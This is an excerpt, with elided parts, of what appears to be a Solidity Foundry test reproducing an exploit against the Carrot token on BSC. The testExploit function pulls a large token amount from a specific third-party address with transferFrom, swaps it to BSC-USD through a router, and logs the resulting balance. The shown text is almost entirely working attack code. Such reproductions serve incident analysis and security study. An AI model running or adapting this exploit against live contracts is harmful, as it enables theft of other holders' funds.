...
contract ContractTest is DSTest {
    ...
    function testExploit() public {
        ...
        Carrot.transferFrom(0x00B433800970286CF08F34C96cf07f35412F1161, address(this), 310_344_736_073_087_429_864_760);

        console.log("Perform Carrot to BSC-USD swap");
        CarrotToUST();

        console.log("After exploiting, BSC-USD balance:", USD.balanceOf(address(this)) / 1e18);
    }
    ...
    function CarrotToUST() internal {
        ...
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Carrot.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
